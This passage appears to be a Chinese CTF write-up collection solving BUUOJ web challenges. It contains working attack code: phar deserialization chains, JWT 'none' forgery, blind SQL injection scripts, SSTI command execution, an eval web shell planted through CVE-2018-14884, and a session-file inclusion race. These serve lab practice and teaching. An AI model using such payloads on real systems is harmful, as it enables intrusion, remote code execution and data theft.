$phar-\u0026gt;setMetadata($o); //添加要压缩的文件，这个文件可以不存在，但这句语句不能少 $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 生成phar后，找触发反序列化利用点\ndownload和delete里面由于download过滤flag\n我们在delete.php里面找到delete函数，回到class.php发现调用unlink函数刚好可以触发反序列化\n[HFCTF2020]EasyLogin 上来查看源码\napp.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 /** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */ function login() { const username = $(\u0026#34;#username\u0026#34;).val(); const password = $(\u0026#34;#password\u0026#34;).val(); const token = sessionStorage.getItem(\u0026#34;token\u0026#34;); $.post(\u0026#34;/api/login\u0026#34;, {username, password, authorization:token}) .done(function(data) { const {status} = data; if(status) { document.location = \u0026#34;/home\u0026#34;; } }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } function register() { const username = $(\u0026#34;#username\u0026#34;).val(); const password = $(\u0026#34;#password\u0026#34;).val(); $.post(\u0026#34;/api/register\u0026#34;, {username, password}) .done(function(data) { const { token } = data; sessionStorage.setItem(\u0026#39;token\u0026#39;, token); document.location = \u0026#34;/login\u0026#34;; }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } function logout() { $.get(\u0026#39;/api/logout\u0026#39;).done(function(data) { const {status} = data; if(status) { document.location = \u0026#39;/login\u0026#39;; } }); } function getflag() { $.get(\u0026#39;/api/flag\u0026#39;).done(function(data) { const {flag} = data; $(\u0026#34;#username\u0026#34;).val(flag); }).fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } 上面说用koa框架写的\nkoa框架基本目录 1 2 3 4 5 6 7 8 9 10 11 koa框架常用目录，文件 app/controllers 项目控制器存放目录：接收请求，处理逻辑 app/dbhelper 数据库CRUD操作的封装 app/models 对应数据库表表结构 config/router.js 项目路由 node_modules app.js 项目入口 访问controllers下的api.js得到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 const crypto = require(\u0026#39;crypto\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;) const jwt = require(\u0026#39;jsonwebtoken\u0026#39;) const APIError = require(\u0026#39;../rest\u0026#39;).APIError; module.exports = { \u0026#39;POST /api/register\u0026#39;: async (ctx, next) =\u0026gt; { const {username, password} = ctx.request.body; if(!username || username === \u0026#39;admin\u0026#39;){ throw new APIError(\u0026#39;register error\u0026#39;, \u0026#39;wrong username\u0026#39;); } if(global.secrets.length \u0026gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString(\u0026#39;hex\u0026#39;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: \u0026#39;HS256\u0026#39;}); ctx.rest({ token: token }); await next(); }, \u0026#39;POST /api/login\u0026#39;: async (ctx, next) =\u0026gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError(\u0026#39;login error\u0026#39;, \u0026#39;username or password is necessary\u0026#39;); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(\u0026#39;.\u0026#39;)[1], \u0026#39;base64\u0026#39;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid \u0026lt; global.secrets.length \u0026amp;\u0026amp; sid \u0026gt;= 0)) { throw new APIError(\u0026#39;login error\u0026#39;, \u0026#39;no such secret id\u0026#39;); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: \u0026#39;HS256\u0026#39;}); const status = username === user.username \u0026amp;\u0026amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, \u0026#39;GET /api/flag\u0026#39;: async (ctx, next) =\u0026gt; { if(ctx.session.username !== \u0026#39;admin\u0026#39;){ throw new APIError(\u0026#39;permission error\u0026#39;, \u0026#39;permission denied\u0026#39;); } const flag = fs.readFileSync(\u0026#39;/flag\u0026#39;).toString(); ctx.rest({ flag }); await next(); }, \u0026#39;GET /api/logout\u0026#39;: async (ctx, next) =\u0026gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); } }; jwt无签名\n不仅签名要改为none，secretid要改为[]，然后把username改为admin\n这里载的是PyJWT包，用python来伪造\n1 2 3 4 5 6 7 8 9 10 11 import jwt token = jwt.encode( { \u0026#34;secretid\u0026#34;: [], \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;iat\u0026#34;: 1742471740 }, algorithm=\u0026#34;none\u0026#34;, key=\u0026#34;\u0026#34;).encode(encoding=\u0026#39;utf-8\u0026#39;) print(token) bp修改放包然后访问/api/flag\n[SWPUCTF 2018]SimplePHP 查看源码\n查看文件这里有任意文件读取\nindex.php\n1 2 3 4 \u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;base.php\u0026#39;; ?\u0026gt; base.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php session_start(); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;web3\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-default\u0026#34; role=\u0026#34;navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;index.php\u0026#34;\u0026gt;首页\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbra-toggle\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;active\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;file.php?file=\u0026#34;\u0026gt;查看文件\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;upload_file.php\u0026#34;\u0026gt;上传文件\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbar-right\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;glyphicon glyphicon-user\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;?php echo $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;];?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;!--flag is in f1ag.php--\u0026gt; file.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;function.php\u0026#39;; include \u0026#39;class.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/var/www/html/\u0026#39;); $file = $_GET[\u0026#34;file\u0026#34;] ? $_GET[\u0026#39;file\u0026#39;] : \u0026#34;\u0026#34;; if(empty($file)) { echo \u0026#34;\u0026lt;h2\u0026gt;There is no file to show!\u0026lt;h2/\u0026gt;\u0026#34;; } $show = new Show(); if(file_exists($file)) { $show-\u0026gt;source = $file; $show-\u0026gt;_show(); } else if (!empty($file)){ die(\u0026#39;file doesn\\\u0026#39;t exists.\u0026#39;); } ?\u0026gt; function.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php //show_source(__FILE__); include \u0026#34;base.php\u0026#34;; header(\u0026#34;Content-type: text/html;charset=utf-8\u0026#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;].$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]).\u0026#34;.jpg\u0026#34;; //mkdir(\u0026#34;upload\u0026#34;,0777); if(file_exists(\u0026#34;upload/\u0026#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $filename); echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;上传成功!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\u0026#34;gif\u0026#34;,\u0026#34;jpeg\u0026#34;,\u0026#34;jpg\u0026#34;,\u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $extension = end($temp); if(empty($extension)) { //echo \u0026#34;\u0026lt;h4\u0026gt;请选择上传的文件:\u0026#34; . \u0026#34;\u0026lt;h4/\u0026gt;\u0026#34;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;Invalid file!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; return false; } } } ?\u0026gt; class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 \u0026lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-\u0026gt;str = $name; } public function __destruct() { $this-\u0026gt;test = $this-\u0026gt;str; echo $this-\u0026gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-\u0026gt;source = $file; //$this-\u0026gt;source = phar://phar.jpg echo $this-\u0026gt;source; } public function __toString() { $content = $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; return $content; } public function __set($key,$value) { $this-\u0026gt;$key = $value; } public function _show() { if(preg_match(\u0026#39;/http|https|file:|gopher|dict|\\.\\.|f1ag/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker!\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker~\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $file; public $params; public function __construct() { $this-\u0026gt;params = array(); } public function __get($key) { return $this-\u0026gt;get($key); } public function get($key) { if(isset($this-\u0026gt;params[$key])) { $value = $this-\u0026gt;params[$key]; } else { $value = \u0026#34;index.php\u0026#34;; } return $this-\u0026gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?\u0026gt; 打pop链加phar反序列化\n先找利用点Test类里面的file_get函数能读取文件内容，要触发__get方法，找到show类里面的__toString然后在C1e4r类里面有echo触发\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?php class C1e4r { public $str; } class Show { public $str; public function __construct() { $this-\u0026gt;str[\u0026#39;str\u0026#39;]=new Test(); } } class Test { public $params; public function __construct() { $this-\u0026gt;params = array(\u0026#34;source\u0026#34; =\u0026gt; \u0026#34;/var/www/html/f1ag.php\u0026#34;); } } $o=new C1e4r(); $o-\u0026gt;str=new Show(); @unlink(\u0026#34;phar.phar\u0026#34;); //生成phar时，文件的后缀名必须为phar $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //设置stub $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //将自定义的meta-data存入manifest，这个是利用的重点 $phar-\u0026gt;setMetadata($o); //添加要压缩的文件，这个文件可以不存在，但这句语句不能少 $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 上传后查看upload路由\n然后在file.php里面有file_exists函数可以触发反序列化\nOctober 2019 Twice SQL Injection 题目叫二次注入\n1 2 3 4 5 6 7 1\u0026#39; union select database()# 1\u0026#39; union select group_concat(table_name)from information_schema.tables where table_schema=database()# 1\u0026#39; union select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;flag\u0026#39;# 1\u0026#39; union select (select group_concat(flag)from flag)# [GYCTF2020]Ezsqli 无列名注入\n爆表\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import time import requests import sys import string import logging # LOG_FORMAT = \u0026#34;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s\u0026#34; # logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT) target=\u0026#34;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php\u0026#34; dataStr=\u0026#34;(select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database())\u0026#34; def binaryTest(i,cu,comparer): s=requests.post(target,data={\u0026#34;id\u0026#34; : \u0026#34;0^(ascii(substr({},{},1)){comparer}{})\u0026#34;.format(dataStr,i,cu,comparer=comparer)}) if \u0026#39;Nu1L\u0026#39; in s.text: return True else: return False def searchFriends_sqli(i): l = 0 r = 255 while (l \u0026lt;= r): cu = (l + r) // 2 if (binaryTest(i, cu, \u0026#34;\u0026lt;\u0026#34;)): r = cu - 1 elif (binaryTest(i, cu, \u0026#34;\u0026gt;\u0026#34;)): l = cu + 1 elif (cu == 0): return None else: return chr(cu) def main(): print(\u0026#34;start\u0026#34;) finres=\u0026#34;\u0026#34; i=1 while (True): extracted_char = searchFriends_sqli(i) if (extracted_char == None): break finres += extracted_char i += 1 print(\u0026#34;(+) 当前结果:\u0026#34;+finres) print(\u0026#34;(+) 运行完成,结果为:\u0026#34;, finres) if __name__==\u0026#34;__main__\u0026#34;: main() 爆flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import requests import time url = \u0026#39;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php\u0026#39; # give_grandpa_pa_pa_pa payload_flag = \u0026#39;1^((1,\\\u0026#39;{}\\\u0026#39;)\u0026gt;(select * from f1ag_1s_h3r3_hhhhh))\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1, 100): time.sleep(0.3)#这里要sleep一下，不然太快了会乱码，本人测试后0.3正好能出结果 low = 32 high = 132 mid = (low + high) // 2 while (low \u0026lt; high): k = flag + chr(mid) payload = payload_flag.format(k) data = {\u0026#34;id\u0026#34;: payload} print(payload) r = requests.post(url=url, data=data) if \u0026#39;Nu1L\u0026#39; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 33: break flag += chr(mid - 1) print(flag.lower()) # 因为出来的flag是大写，这边全部转为小写 print(flag.lower()) [CISCN2019 总决赛 Day2 Web1]Easyweb 有robots.txt，查看image.php.bak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php include \u0026#34;config.php\u0026#34;; $id=isset($_GET[\u0026#34;id\u0026#34;])?$_GET[\u0026#34;id\u0026#34;]:\u0026#34;1\u0026#34;; $path=isset($_GET[\u0026#34;path\u0026#34;])?$_GET[\u0026#34;path\u0026#34;]:\u0026#34;\u0026#34;; $id=addslashes($id); $path=addslashes($path); $id=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$id); $path=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$path); $result=mysqli_query($con,\u0026#34;select * from images where id=\u0026#39;{$id}\u0026#39; or path=\u0026#39;{$path}\u0026#39;\u0026#34;); $row=mysqli_fetch_array($result,MYSQLI_ASSOC); $path=\u0026#34;./\u0026#34; . $row[\u0026#34;path\u0026#34;]; header(\u0026#34;Content-Type: image/jpeg\u0026#34;); readfile($path); 要单引号尝试注入，这里看到id先经过addslashes函数转义然后再被str_replace替换为空\n我们直接在id这里用\\\\0这样\\0会被转义成\\\\0，然后又被替换成空，最后剩个\\把后面的单引号转义\n可以看界面有无JFIF字符串判断是否有图片\npayload\n1 image.php?id=\\\\0\u0026amp;path=or ascii(substring(database(),%s,1))=%s # 盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import requests url = \u0026#34;http://727bcaec-8c37-47b6-8428-161fcbeeeb42.node5.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=\u0026#34; payload = \u0026#34; or ascii(substr((select password from users),{},1))\u0026gt;{}%23\u0026#34; result = \u0026#39;\u0026#39; for i in range(1,100): high = 127 low = 32 mid = (low+high) // 2 # print(mid) while(high\u0026gt;low): r = requests.get(url + payload.format(i,mid)) # print(url + payload.format(i,mid)) if \u0026#39;JFIF\u0026#39; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 result += chr(mid) print(result) 用户名admin，密码84582e71d43b59c72f38\n进来是一个文件上传\n随便上传发现上传到日志去了，直接文件名写木马,日志文件包含\n[RootersCTF2019]I_\u0026lt;3_Flask 肯定打ssti，爆参数\n1 {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[182].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;)}} 抄一个别人的\n1 ?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026#34;) }}{% endif %}{% endfor %} [NPUCTF2020]ezinclude 上来先看源码\n由于不知道$secret的值，我们先传个name看看\n把响应的hash填入发包\n1 ?name=1\u0026amp;pass=576322dd496b99d07b5b0f7fa7934a25 有个flflflflag.php\n伪协议读文件\n1 ?file=php://filter/read=convert.base64-encode/resource=flflflflag.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.location.href=\u0026#34;404.html\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;title\u0026gt;this_is_not_fl4g_and_出题人_wants_girlfriend\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php $file=$_GET[\u0026#39;file\u0026#39;]; if(preg_match(\u0026#39;/data|input|zip/is\u0026#39;,$file)){ die(\u0026#39;nonono\u0026#39;); } @include($file); echo \u0026#39;include($_GET[\u0026#34;file\u0026#34;])\u0026#39;; ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 目录扫描会发现dir.php\n1 2 3 \u0026lt;?php var_dump(scandir(\u0026#39;/tmp\u0026#39;)); ?\u0026gt; 然后\n法一：利用php7 segment fault特性（CVE-2018-14884） php代码中使用php://filter的 strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。\n使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，知道文件名就可以getshell。这个崩溃原因是存在一处空指针引用。向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留，临时文件会被保存在upload_tmp_dir所指定的目录下，默认为tmp文件夹。\n该方法仅适用于以下php7版本，php5并不存在该崩溃。\n1 2 3 4 5 php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复 php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复 php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复 利用url\n1 /flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd 打这个cve\n1 2 3 4 5 6 import requests from io import BytesIO #BytesIO实现了在内存中读写bytes payload = \u0026#34;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#34; data={\u0026#39;file\u0026#39;: BytesIO(payload.encode())} url=\u0026#34;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\u0026#34; r=requests.post(url=url,files=data,allow_redirects=False) 这样就在tmp目录下写入木马了\n我们用dir.php查看位置\n1 http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=/tmp/php3r0kqs 连接上用蚁剑插件绕过，发现不行，bp在post传参cmd=phpinfo()看看，直接搜flag就有了\n法二：利用 session.upload_progress 进行 session 文件包含 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import io import re import sys import requests import threading host = \u0026#39;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php\u0026#39; sessid = \u0026#39;yym68686\u0026#39; def POST(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50) session.post( host, data={\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34;:\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;}, files={\u0026#34;file\u0026#34;:(\u0026#39;a.txt\u0026#39;, f)}, cookies={\u0026#39;PHPSESSID\u0026#39;:sessid} ) def READ(session): while True: response = session.get(f\u0026#39;{host}?file=/tmp/sess_{sessid}\u0026#39;) if \u0026#39;flag{\u0026#39; not in response.text: print(\u0026#39;\\rWaiting...\u0026#39;, end=\u0026#34;\u0026#34;) else: print(\u0026#34;\\r\u0026#34; + re.search(r\u0026#39;flag{(.*?)}\u0026#39;, response.text).group(0)) sys.exit(0) with requests.session() as session: t1 = threading.Thread(target=POST, args=(session, )) t1.daemon = True t1.start() READ(session) [NCTF2019]SQLi 有个robots.txt\n这里waf了一堆关键字,用户名是admin\n主要用regexp正则来绕过\npayload\n1 select * from users where username=\u0026#39;\\\u0026#39; and passwd=\u0026#39;||/**/passwd/**/regexp/**/\\\u0026#34;^a\\\u0026#34;;%00\u0026#39; 1 payload: username=\\\u0026amp;passwd=||passwd/**/regexp/**/\u0026#34;^a\u0026#34;;%00 通过\\ 转义username后第二个单引号进而闭合掉passwd后第一个引号 通过%00截断 代替# – regexp “^a” 表示 查找passwd列中以a为起始的 如果注入成功会回显welcome.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import requests from urllib.parse import unquote import string url = \u0026#39;http://eec98765-3741-49a5-8773-6d1b31843e2e.node5.buuoj.cn:81/\u0026#39; cookies = { \u0026#39;UM_distinctid\u0026#39;: \u0026#39;17e150f6a59ecb-028dcf28d64a708-4c3e2679-384000-17e150f6a5a90d\u0026#39;, } headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, \u0026#39;Origin\u0026#39;: \u0026#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;, \u0026#39;Referer\u0026#39;: \u0026#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81/\u0026#39;, \u0026#39;Upgrade-Insecure-Requests\u0026#39;: \u0026#39;1\u0026#39;, } table = string.ascii_letters + string.digits + \u0026#39;_{}\u0026#39; flag = \u0026#39;\u0026#39; for j in range(50): for i in table: data = { \u0026#39;username\u0026#39;: \u0026#39;\\\\\u0026#39;, \u0026#39;passwd\u0026#39;: f\u0026#39;||(passwd/**/regexp/**/\u0026#34;^{flag + i}\u0026#34;);\u0026#39; + unquote(\u0026#39;%00\u0026#39;) } response = requests.post(url, headers=headers, cookies=cookies, data=data) if \u0026#39;404 Not Found\u0026#39; in response.text: flag = flag + i break else: continue print(str.lower(flag)) [网鼎杯 2020 半决赛]AliceWebsite index.php\n1 2 3 4 5 6 7 8 \u0026lt;?php $action = (isset($_GET[\u0026#39;action\u0026#39;]) ? $_GET[\u0026#39;action\u0026#39;] : \u0026#39;home.php\u0026#39;); if (file_exists($action)) { include $action; } else { echo \u0026#34;File not found!\u0026#34;; } ?\u0026gt; 有文件包含，然后用目录穿越读到flag\n[HarekazeCTF2019]encode_and_encode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php error_reporting(0); if (isset($_GET[\u0026#39;source\u0026#39;])) { show_source(__FILE__); exit(); } function is_valid($str) { $banword = [ // no path traversal \u0026#39;\\.\\.\u0026#39;, // no stream wrapper \u0026#39;(php|file|glob|data|tp|zip|zlib|phar):\u0026#39;, // no data exfiltration \u0026#39;flag\u0026#39; ]; $regexp = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $banword) . \u0026#39;/i\u0026#39;; if (preg_match($regexp, $str)) { return false; } return true; } $body = file_get_contents(\u0026#39;php://input\u0026#39;); $json = json_decode($body, true); if (is_valid($body) \u0026amp;\u0026amp; isset($json) \u0026amp;\u0026amp; isset($json[\u0026#39;page\u0026#39;])) { $page = $json[\u0026#39;page\u0026#39;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = \u0026#34;\u0026lt;p\u0026gt;not found\u0026lt;/p\u0026gt;\\n\u0026#34;; } } else { $content = \u0026#39;\u0026lt;p\u0026gt;invalid request\u0026lt;/p\u0026gt;\u0026#39;; } // no data exfiltration!!! $content = preg_replace(\u0026#39;/HarekazeCTF\\{.+\\}/i\u0026#39;, \u0026#39;HarekazeCTF{\u0026amp;lt;censored\u0026amp;gt;}\u0026#39;, $content); echo json_encode([\u0026#39;content\u0026#39; =\u0026gt; $content]); unicode编码绕过正则匹配，因为json_decode时会把unicode编码转码\njson格式的page传伪协议读flag\n1 2 {\u0026#34;page\u0026#34;:\u0026#34;php://filter/convert.base64-encode/resource=/flag\u0026#34;} {\u0026#34;page\u0026#34;:\u0026#34;\\u0070\\u0068\\u0070\\u003A\\u002F\\u002F\\u0066\\u0069\\u006C\\u0074\\u0065\\u0072\\u002F\\u0063\\u006F\\u006E\\u0076\\u0065\\u0072\\u0074\\u002E\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002D\\u0065\\u006E\\u0063\\u006F\\u0064\\u0065\\u002F\\u0072\\u0065\\u0073\\u006F\\u0075\\u0072\\u0063\\u0065\\u003D\\u002F\\u0066\\u006C\\u0061\\u0067\u0026#34;} [SUCTF 2019]EasyWeb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 